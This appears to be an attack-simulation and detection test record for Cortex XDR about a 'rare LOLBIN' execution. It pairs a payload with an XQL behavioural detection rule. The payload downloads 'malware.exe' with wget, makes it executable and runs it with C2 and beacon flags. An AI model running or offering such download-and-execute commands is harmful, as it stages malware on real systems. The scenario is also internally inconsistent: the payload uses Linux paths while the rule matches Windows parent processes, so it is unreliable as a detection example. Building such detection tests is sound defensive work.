identity.name: Rare LOLBIN Process Execution by User
identity.summary: An attacker executes a rare LOLBIN (Living Off The Land Binary) from a user context to evade detection. Cortex should detect the unusual process execution based on behavioral analytics and MITRE ATT&C
identity.description: An attacker executes a rare LOLBIN (Living Off The Land Binary) from a user context to evade detection. Cortex should detect the unusual process execution based on behavioral analytics and MITRE ATT&CK technique mapping.

payload.code:
wget http://192.0.2.5/malware.exe -O /tmp/evil.exe
stub chmod +x /tmp/evil.exe
stub /tmp/evil.exe --c2 192.0.2.100:8080
stub /tmp/evil.exe --beacon

expected_artifacts.description: Execution of a rare LOLBIN process

manual_steps: Not authored. Write and test cleanup before promotion.

biocs.name: Rare LOLBIN Process Execution by User
biocs.description: Detection of uncommon LOLBIN usage by a user process
biocs.logic:
dataset = xdr_data
| filter event_type = ENUM.PROCESS and event_sub_type = ENUM.PROCESS_START
| filter action_process_image_name in ('evil.exe')
| filter actor_process_image_name = 'explorer.exe'
| filter causality_actor_process_image_name = 'svchost.exe'
